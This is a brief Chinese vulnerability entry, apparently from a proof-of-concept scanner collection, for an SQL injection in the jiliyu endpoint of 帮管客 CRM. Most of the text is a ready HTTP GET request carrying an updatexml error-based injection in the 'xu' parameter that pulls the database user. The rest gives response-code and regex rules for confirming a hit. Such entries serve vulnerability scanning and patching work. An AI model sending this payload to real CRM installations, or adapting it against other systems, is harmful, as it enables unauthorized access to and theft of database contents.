﻿# 帮管客crm jiliyu sql注入漏洞

> 更新时间：2024-03-08

> 漏洞编号：

> 漏洞说明：帮管客 crm jiliyu存在sql注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

> 漏洞特征：

> 验证脚本：HTTP

```
GET 
/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20user()),0x7f),1)) HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?syntax)(?=.*?error).*?$

> 上传文件定位：

> 验证文件来源：帮管客crm jiliyu sql注入漏洞.poc

